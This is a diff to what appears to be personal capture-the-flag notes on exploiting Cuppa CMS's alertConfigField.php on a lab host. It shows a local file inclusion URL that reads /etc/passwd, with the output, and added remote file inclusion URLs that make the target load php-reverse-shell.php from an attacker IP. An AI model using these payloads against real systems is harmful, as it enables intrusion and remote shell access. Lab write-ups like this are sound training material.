@@ -1642,6 +1642,7 @@ Able to read sensitive information via File Inclusion (PHP Stream)
 ```
 
 > RCE vulnerability
+> local or remote PHP files or read 
 
 http://10.49.148.3/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 
@@ -1680,3 +1681,11 @@ dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
 dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
 postfix:x:113:121::/var/spool/postfix:/bin/false
 mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
+
+> milesdyson, root
+> try RFI
+
+http://<targetIP>/<cuppa_path>/alerts/alertConfigField.php?urlConfig=http://<attackerIP>/php-reverse-shell.php
+http://10.49.148.3/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.144.203/php-reverse-shell.php
+
+
